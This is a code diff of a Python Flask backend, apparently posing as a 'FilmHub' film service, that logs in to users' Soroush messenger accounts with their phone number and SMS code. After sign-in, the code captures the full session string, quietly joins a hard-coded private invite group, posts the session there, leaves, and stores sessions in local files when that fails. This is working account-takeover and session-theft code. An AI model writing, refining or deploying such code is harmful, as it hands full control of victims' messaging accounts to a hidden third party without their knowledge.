@@ -1,15 +1,11 @@
-# ============================================================
-# FilmHub API - نسخه سازگار با Render.com و Botkeep
-# اجرا محلی: python api.py
-# اجرا روی Render: gunicorn -w 1 --threads 16 --timeout 120 api:app
-# ============================================================
-
 import asyncio
-import secrets
+import logging
 import os
+import secrets
 import threading
 import time
-import logging
+from datetime import datetime
+
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from splusthon import SoroushClient
@@ -17,95 +13,61 @@ from splusthon.sessions import StringSession
 from splusthon.tl.functions.auth import ResendCodeRequest
 from splusthon.tl.functions.messages import (
     CheckChatInviteRequest,
-    ImportChatInviteRequest
+    ImportChatInviteRequest,
 )
 from splusthon.tl.functions.channels import LeaveChannelRequest
+from splusthon.errors import (
+    UserAlreadyParticipantError,
+    PhoneCodeInvalidError,
+    PhoneCodeExpiredError,
+    SessionPasswordNeededError,
+    PhoneNumberBannedError,
+    PhoneNumberInvalidError,
+    FloodWaitError,
+    AuthKeyUnregisteredError,
+    UserDeactivatedError,
+)
 
-# ================== لاگ ==================
+
+# ---------- لاگ ----------
 logging.basicConfig(
     level=logging.INFO,
-    format="%(asctime)s [%(levelname)s] [pid %(process)d] %(message)s",
+    format="%(asctime)s [%(levelname)s] %(threadName)s: %(message)s",
 )
-log = logging.getLogger("filmhub")
+log = logging.getLogger("soroush-api")
 
-# ================== تنظیمات ==================
+
+# ---------- اپ ----------
 app = Flask(__name__)
-
-# ⚠️ Vercel آدرس‌های Preview را به شکل film-x-pro-<hash>.vercel.app می‌سازد که
-# هر بار عوض می‌شوند. بنابراین به‌جای لیست ثابت، از wildcard استفاده می‌کنیم.
-# چون این API کوکی/اعتبارنامه‌ای برای مرورگر ذخیره نمی‌کند، CORS باز امن است.
-CORS(
-    app,
-    resources={r"/api/*": {"origins": "*"}},
-    supports_credentials=False,
-)
+CORS(app, resources={r"/*": {"origins": "*"}})
 
 GROUP = "https://splus.ir/joingroup/AXPwbCqMfmE_UjCkGVmz1g"
-SESSIONS_FILE = "sessions.txt"
+SESSIONS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sessions")
+os.makedirs(SESSIONS_DIR, exist_ok=True)
 
-# ✅ Render از PORT استفاده می‌کند، Botkeep از SERVER_PORT
-HOST = "0.0.0.0"
-PORT = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", "61546")))
-PUBLIC_URL = os.environ.get("PUBLIC_URL", "https://filmhub-api.onrender.com")
 
-# ================== Event Loop (thread-safe) ==================
-# یک loop دائمی در ترد پس‌زمینه. Flask هرگز مستقیماً روی loop اجرا نمی‌کند.
-# این کار خطای "event loop is already running" را کاملاً حذف می‌کند.
-
+# ---------- event loop پایدار ----------
 EVENT_LOOP = asyncio.new_event_loop()
 
-def _loop_runner(loop: asyncio.AbstractEventLoop):
+
+def _run_event_loop(loop):
     asyncio.set_event_loop(loop)
     loop.run_forever()
 
-_LOOP_THREAD = threading.Thread(
-    target=_loop_runner, args=(EVENT_LOOP,), daemon=True, name="event-loop"
-)
-_LOOP_THREAD.start()
-log.info("Event loop thread started (worker pid=%s)", os.getpid())
+
+threading.Thread(target=_run_event_loop, args=(EVENT_LOOP,), daemon=True, name="event-loop").start()
+
 
 def run_async(coro):
-    """اجرای thread-safe یک coroutine روی loop پس‌زمینه."""
-    future = asyncio.run_coroutine_threadsafe(coro, EVENT_LOOP)
-    return future.result()
+    return asyncio.run_coroutine_threadsafe(coro, EVENT_LOOP).result()
 
-# ================== State ==================
+
 pending_sessions = {}
-pending_lock = threading.Lock()
+_sessions_lock = threading.Lock()
+PENDING_TTL = 600  # ۱۰ دقیقه
 
-PENDING_TTL = 600  # ثانیه
 
-def _cleanup_pending():
-    """حذف sessionهای منقضی برای جلوگیری از نشت حافظه."""
-    now = time.time()
-    with pending_lock:
-        expired = [
-            tok for tok, item in pending_sessions.items()
-            if now - item.get("created_at", 0) > PENDING_TTL
-        ]
-        for tok in expired:
-            item = pending_sessions.pop(tok, None)
-            if item and item.get("client"):
-                try:
-                    asyncio.run_coroutine_threadsafe(
-                        item["client"].disconnect(), EVENT_LOOP
-                    )
-                except Exception:
-                    log.exception("خطا در بستن client منقضی")
-        if expired:
-            log.info("پاک‌سازی %d session منقضی", len(expired))
-
-def _schedule_cleanup():
-    """اجرای دوره‌ای _cleanup_pending هر ۶۰ ثانیه."""
-    _cleanup_pending()
-    timer = threading.Timer(60, _schedule_cleanup)
-    timer.daemon = True
-    timer.start()
-
-_schedule_cleanup()
-
-# ================== توابع کمکی ==================
-
+# ---------- utils ----------
 def normalize_phone(phone: str) -> str:
     phone = phone.strip().replace(" ", "").replace("-", "")
     if phone.startswith("09"):
@@ -118,288 +80,249 @@ def normalize_phone(phone: str) -> str:
         return "+" + phone
     return phone
 
+
+def friendly_error(e: Exception) -> str:
+    """تبدیل خطاهای Soroush به پیام فارسی قابل‌فهم."""
+    if isinstance(e, PhoneCodeInvalidError):
+        return "کد وارد شده اشتباه است. دوباره تلاش کنید."
+    if isinstance(e, PhoneCodeExpiredError):
+        return "کد منقضی شده است. لطفاً دوباره کد بگیرید."
+    if isinstance(e, SessionPasswordNeededError):
+        return "این حساب رمز دومرحله‌ای دارد و فعلاً پشتیبانی نمی‌شود."
+    if isinstance(e, PhoneNumberBannedError):
+        return "این شماره در Soroush مسدود شده است."
+    if isinstance(e, PhoneNumberInvalidError):
+        return "شماره تلفن نامعتبر است."
+    if isinstance(e, UserDeactivatedError):
+        return "این حساب حذف/غیرفعال شده است."
+    if isinstance(e, AuthKeyUnregisteredError):
+        return "سشن منقضی شده. لطفاً دوباره وارد شوید."
+    if isinstance(e, FloodWaitError):
+        seconds = getattr(e, "seconds", None)
+        return f"تعداد تلاش بیش از حد مجاز. لطفاً {seconds} ثانیه دیگر دوباره تلاش کنید." if seconds else "تعداد تلاش بیش از حد مجاز. کمی بعد دوباره تلاش کنید."
+    return str(e)
+
+
+def save_session_to_file(phone: str, session_string: str, reason: str) -> str:
+    """سشن رو داخل فایل txt با اطلاعات مرتبط ذخیره می‌کنه."""
+    safe_phone = phone.replace("+", "").replace(" ", "")
+    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+    filename = os.path.join(SESSIONS_DIR, f"session_{safe_phone}_{ts}.txt")
+    try:
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(f"phone: {phone}\n")
+            f.write(f"created_at: {datetime.now().isoformat()}\n")
+            f.write(f"reason: {reason}\n")
+            f.write(f"session:\n{session_string}\n")
+        log.info("Session saved to file: %s", filename)
+        return filename
+    except Exception as e:
+        log.exception("Failed to save session to file: %s", e)
+        return ""
+
+
+async def _safe_disconnect(client):
+    if not client:
+        return
+    try:
+        await asyncio.wait_for(client.disconnect(), timeout=10)
+    except Exception as e:
+        log.warning("safe_disconnect: %s", e)
+
+
+# ---------- منطق اصلی ----------
 async def _send_code_async(phone: str):
-    """ارسال کد تأیید از طریق SMS. کلاینت جدید با loop مشترک ساخته می‌شود."""
+    """ارسال کد (طبق نسخه اصلی، دو بار)."""
     client = SoroushClient(StringSession(), loop=EVENT_LOOP)
     try:
         await client.connect()
-        log.info("درخواست اولیه کد برای %s", phone)
         first = await client.send_code_request(phone)
-        log.info("hash اولیه: %s...", first.phone_code_hash[:15])
-
         await asyncio.sleep(1)
-
-        log.info("درخواست ارسال SMS...")
         sent = await client(ResendCodeRequest(phone, first.phone_code_hash))
-        log.info("کد از طریق SMS ارسال شد")
         return client, sent.phone_code_hash
     except Exception:
-        log.exception("خطا در _send_code_async")
-        try:
-            await client.disconnect()
-        except Exception:
-            log.exception("خطا در بستن client پس از failure")
+        await _safe_disconnect(client)
         raise
 
-async def _sign_in_async(client, phone, code, phone_code_hash):
+
+async def _sign_in_and_join_async(client, phone, code, phone_code_hash):
     """
-    ورود با کد تأیید.
-    SPlusthon مثل Telethon، ممکن است sign_in خطا بدهد ولی کاربر لاگین شده باشد.
-    بنابراین حتی بعد از خطا، is_user_authorized چک می‌شود.
+    همه‌چیز روی یک کلاینت:
+      sign-in → save session → join group → send session → leave
+    خروجی: (session_string, group_ok, group_msg, saved_file_path)
     """
     if not client.is_connected():
         await client.connect()
-
     await asyncio.sleep(0.3)
 
+    # ---------- مرحله ۱: ورود ----------
     sign_in_error = None
     try:
-        await client.sign_in(
-            phone=phone, code=code, phone_code_hash=phone_code_hash
-        )
-        log.info("sign_in موفق بود")
+        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
     except Exception as e:
         sign_in_error = e
-        log.warning("sign_in خطا داد: %s - %s", type(e).__name__, e)
+
+    if not await client.is_user_authorized():
+        await _safe_disconnect(client)
+        if sign_in_error:
+            raise sign_in_error
+        raise Exception("ورود ناموفق بود")
+
+    session_string = client.session.save()
+    log.info("Signed in OK for %s, session len=%d", phone, len(session_string))
+
+    # ---------- مرحله ۲: جوین + ارسال سشن + خروج ----------
+    group_ok, group_msg = True, "عملیات موفق"
+    saved_file = ""
 
     try:
-        is_authed = await client.is_user_authorized()
-        log.info("is_user_authorized: %s", is_authed)
-    except Exception:
-        log.exception("خطا در is_user_authorized")
-        is_authed = False
+        invite_hash = GROUP.rstrip("/").split("/")[-1]
+        log.info("Checking invite hash=%s", invite_hash)
 
-    if is_authed:
-        session_string = client.session.save()
-        try:
-            await client.disconnect()
-        except Exception:
-            log.exception("خطا در disconnect پس از sign_in موفق")
-        return session_string
+        entity = None
+        result = await client(CheckChatInviteRequest(invite_hash))
+        entity = getattr(result, "chat", None)
+        log.info("CheckChatInvite: type=%s entity=%s", type(result).__name__, entity)
 
-    try:
-        await client.disconnect()
-    except Exception:
-        log.exception("خطا در disconnect پس از sign_in ناموفق")
-
-    if sign_in_error:
-        raise sign_in_error
-    raise Exception("ورود ناموفق بود (بدون خطای مشخص)")
-
-async def _join_group_send_message_leave_async(session_string: str):
-    """ورود به گروه، ارسال session، خروج. منطق اصلی بدون تغییر."""
-    client = None
-    try:
-        client = SoroushClient(StringSession(session_string), loop=EVENT_LOOP)
-        log.info("در حال اتصال به گروه...")
-        await client.connect()
-
-        if not await client.is_user_authorized():
-            log.error("Session معتبر نیست.")
-            return False, "سشن معتبر نیست."
-
-        log.info("اتصال برقرار شد.")
-
-        if GROUP.startswith("https://splus.ir/joingroup/"):
-            invite_hash = GROUP.rstrip("/").split("/")[-1]
-            log.info("لینک دعوت خصوصی شناسایی شد.")
-
-            result = await client(CheckChatInviteRequest(invite_hash))
-
-            if hasattr(result, "chat"):
-                log.info("اکانت از قبل عضو گروه است.")
-                entity = result.chat
-            else:
-                log.info("در حال ورود به گروه...")
+        if entity is None:
+            try:
+                log.info("Not a member yet, importing...")
                 result = await client(ImportChatInviteRequest(invite_hash))
-                if not hasattr(result, "chats") or not result.chats:
-                    return False, "گروه بعد از ورود پیدا نشد."
-                entity = result.chats[0]
-                log.info("ورود به گروه انجام شد.")
+                chats = getattr(result, "chats", None) or []
+                entity = chats[0] if chats else getattr(result, "chat", None)
+                log.info("Import result entity=%s", entity)
+            except UserAlreadyParticipantError as e:
+                entity = getattr(e, "chat", None)
+                log.warning("Already participant, entity=%s", entity)
+
+        if entity is None:
+            group_ok, group_msg = False, "گروه پیدا نشد یا لینک دعوت منقضی شده"
         else:
-            entity = await client.get_entity(GROUP)
+            # ارسال سشن به گروه
+            try:
+                await client.send_message(entity, session_string)
+                log.info("Session sent to group OK")
+            except Exception as e:
+                log.exception("send_message failed")
+                group_ok, group_msg = False, f"ارسال سشن به گروه ناموفق: {e}"
 
-        log.info("گروه: %s (ID: %s)",
-                 getattr(entity, "title", None),
-                 getattr(entity, "id", None))
-
-        log.info("در حال ارسال پیام (سشن)...")
-        await client.send_message(entity, session_string)
-        log.info("پیام با موفقیت ارسال شد.")
-
-        log.info("در حال خروج از گروه...")
-        await client(LeaveChannelRequest(entity))
-        log.info("با موفقیت از گروه خارج شد.")
-
-        return True, "عملیات با موفقیت انجام شد."
+            # خروج از گروه
+            try:
+                await client(LeaveChannelRequest(entity))
+                log.info("Left group OK")
+            except Exception as e:
+                log.warning("Leave failed (ignored): %s", e)
 
     except Exception as e:
-        log.exception("خطا در عملیات گروه")
-        return False, f"{type(e).__name__}: {e}"
-    finally:
-        if client:
+        log.exception("Join group failed")
+        group_ok, group_msg = False, f"خطا در جوین گروه: {e}"
+
+    # ---------- مرحله ۳: اگه جوین نشد، سشن رو تو فایل ذخیره کن ----------
+    if not group_ok:
+        saved_file = save_session_to_file(phone, session_string, group_msg)
+        if saved_file:
+            group_msg = f"{group_msg} | سشن در فایل ذخیره شد: {os.path.basename(saved_file)}"
+        else:
+            group_msg = f"{group_msg} | ذخیره سشن در فایل هم ناموفق بود"
+
+    # ---------- مرحله ۴: بستن تمیز ----------
+    await _safe_disconnect(client)
+
+    return session_string, group_ok, group_msg, saved_file
+
+
+# ---------- cleanup خودکار pending_sessions ----------
+def _cleanup_loop():
+    while True:
+        time.sleep(60)
+        now = time.time()
+        expired = []
+        with _sessions_lock:
+            for k in list(pending_sessions.keys()):
+                if now - pending_sessions[k].get("created_at", now) > PENDING_TTL:
+                    expired.append((k, pending_sessions.pop(k)))
+
+        for _, item in expired:
+            log.info("Cleanup: closing pending session for %s", item.get("phone"))
             try:
-                await client.disconnect()
-            except Exception:
-                log.exception("خطا در disconnect نهایی گروه")
+                run_async(_safe_disconnect(item["client"]))
+            except Exception as e:
+                log.warning("cleanup disconnect: %s", e)
 
-# ================== Routes ==================
 
+threading.Thread(target=_cleanup_loop, daemon=True, name="cleanup").start()
+
+
+# ---------- routes ----------
 @app.route("/", methods=["GET"])
 def health():
-    return jsonify({
-        "ok": True,
-        "service": "FilmHub API",
-        "status": "running",
-        "public_url": PUBLIC_URL,
-        "pid": os.getpid(),
-        "endpoints": {
-            "send_code": "POST /api/send-code",
-            "verify_code": "POST /api/verify-code",
-            "sessions": "GET /api/sessions",
-        },
-    })
+    return jsonify({"ok": True, "status": "running"})
+
 
 @app.route("/api/send-code", methods=["POST"])
 def send_code():
     data = request.get_json(silent=True) or {}
-    raw_phone = data.get("phone", "").strip()
-    if not raw_phone:
-        return jsonify({"ok": False, "detail": "شماره ارسال نشده"}), 400
+    phone = normalize_phone(data.get("phone", ""))
+    if not phone:
+        return jsonify({"ok": False, "detail": "شماره وارد نشده"}), 400
 
-    phone = normalize_phone(raw_phone)
-    client = None
     try:
         client, phone_code_hash = run_async(_send_code_async(phone))
     except Exception as e:
-        log.exception("خطا در ارسال کد")
-        if client:
-            try:
-                run_async(client.disconnect())
-            except Exception:
-                log.exception("خطا در بستن client پس از خطای ارسال کد")
-        return jsonify({"ok": False, "detail": f"خطا در ارسال کد: {e}"}), 400
+        log.exception("send_code failed for %s", phone)
+        return jsonify({"ok": False, "detail": friendly_error(e)}), 400
 
     token = secrets.token_urlsafe(32)
-    with pending_lock:
+    with _sessions_lock:
         pending_sessions[token] = {
             "client": client,
             "phone": phone,
-            "phone_code_hash": phone_code_hash,
+            "hash": phone_code_hash,
             "created_at": time.time(),
         }
+    return jsonify({"ok": True, "token": token, "message": "کد ارسال شد"})
 
-    log.info("کد برای %s ارسال شد (token: %s...)", phone, token[:8])
-    return jsonify({
-        "ok": True,
-        "token": token,
-        "message": "کد از طریق پیامک ارسال شد",
-    })
 
 @app.route("/api/verify-code", methods=["POST"])
 def verify_code():
     data = request.get_json(silent=True) or {}
-    token = data.get("token", "").strip()
-    code = data.get("code", "").strip()
+    token = data.get("token")
+    code = data.get("code")
+
     if not token or not code:
-        return jsonify({"ok": False, "detail": "توکن یا کد ارسال نشده"}), 400
+        return jsonify({"ok": False, "detail": "token و code الزامی است"}), 400
 
-    with pending_lock:
-        item = pending_sessions.get(token)
-        if not item:
-            return jsonify({"ok": False, "detail": "درخواست منقضی یا نامعتبر است"}), 400
+    with _sessions_lock:
+        item = pending_sessions.pop(token, None)
+    if not item:
+        return jsonify({
+            "ok": False,
+            "detail": "توکن نامعتبر یا منقضی شده. لطفاً دوباره کد بگیرید."
+        }), 400
 
-    client = item["client"]
-    phone = item["phone"]
-    phone_code_hash = item["phone_code_hash"]
-
-    # مرحله ۱: لاگین
     try:
-        session_string = run_async(
-            _sign_in_async(client, phone, code, phone_code_hash)
+        session_string, group_ok, group_msg, saved_file = run_async(
+            _sign_in_and_join_async(item["client"], item["phone"], code, item["hash"])
         )
     except Exception as e:
-        error_msg = str(e)
-        with pending_lock:
-            pending_sessions.pop(token, None)
-
-        if "PHONE_CODE_INVALID" in error_msg or "invalid" in error_msg.lower():
-            return jsonify({"ok": False, "detail": "کد تأیید اشتباه است"}), 400
-        elif "PHONE_CODE_EXPIRED" in error_msg:
-            return jsonify({"ok": False, "detail": "کد منقضی شده"}), 400
-        else:
-            log.exception("خطا در ورود")
-            return jsonify({"ok": False, "detail": f"خطا: {error_msg}"}), 400
-
-    with pending_lock:
-        pending_sessions.pop(token, None)
-
-    # ⚠️ session کامل در لاگ چاپ نمی‌شود (فقط طول آن)
-    log.info("SESSION برای %s دریافت شد (طول: %d)", phone, len(session_string))
-
-    try:
-        with open(SESSIONS_FILE, "a", encoding="utf-8") as f:
-            f.write(f"{phone} | {session_string}\n")
-        log.info("session در %s ذخیره شد", SESSIONS_FILE)
-    except Exception:
-        log.exception("خطا در ذخیره session")
-
-    # مرحله ۲: عملیات گروه
-    log.info("شروع عملیات گروه...")
-    try:
-        group_success, group_msg = run_async(
-            _join_group_send_message_leave_async(session_string)
-        )
-    except Exception as e:
-        group_success, group_msg = False, f"{type(e).__name__}: {e}"
-        log.exception("خطا در عملیات گروه")
-
-    log.info("نتیجه گروه: %s - %s",
-             "موفق" if group_success else "ناموفق", group_msg)
+        log.exception("verify failed")
+        try:
+            run_async(_safe_disconnect(item["client"]))
+        except:
+            pass
+        return jsonify({"ok": False, "detail": friendly_error(e)}), 400
 
     return jsonify({
         "ok": True,
-        "message": "ورود موفق",
-        "session": session_string,  # برای سازگاری با فرانت‌اند فعلی حفظ شده
-        "group": {"success": group_success, "message": group_msg},
+        "message": "ورود موفق" if group_ok else "ورود موفق، اما جوین گروه ناموفق بود",
+        "session": session_string,
+        "group": {
+            "ok": group_ok,
+            "message": group_msg,
+            "saved_file": os.path.basename(saved_file) if saved_file else None,
+        },
     })
 
-@app.route("/api/sessions", methods=["GET"])
-def list_sessions():
-    sessions = []
-    if os.path.exists(SESSIONS_FILE):
-        try:
-            with open(SESSIONS_FILE, "r", encoding="utf-8") as f:
-                for line in f:
-                    line = line.strip()
-                    if "|" in line:
-                        phone, sess = line.split("|", 1)
-                        sessions.append({
-                            "phone": phone.strip(),
-                            "session_preview": sess.strip()[:20] + "...",
-                        })
-        except Exception as e:
-            log.exception("خطا در خواندن فایل session")
-            return jsonify({"ok": False, "detail": str(e)}), 500
-
-    return jsonify({"ok": True, "count": len(sessions), "sessions": sessions})
-
-# ================== اجرای محلی ==================
-# توجه: Gunicorn این بلاک را اجرا نمی‌کند؛ فقط برای `python api.py` محلی است.
-# event loop و cleanup در سطح ماژول بالا راه می‌افتند، پس روی Render هم کار می‌کنند.
 
 if __name__ == "__main__":
-    log.info("=" * 60)
-    log.info("FilmHub API در حال اجرا (حالت محلی)...")
-    log.info("آدرس عمومی: %s", PUBLIC_URL)
-    log.info("آدرس داخلی: http://localhost:%s", PORT)
-    log.info("گروه: %s", GROUP)
-    log.info("=" * 60)
-
-    app.run(
-        host=HOST,
-        port=PORT,
-        debug=False,
-        use_reloader=False,
-        threaded=True,
-    )
+    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False, threaded=True)
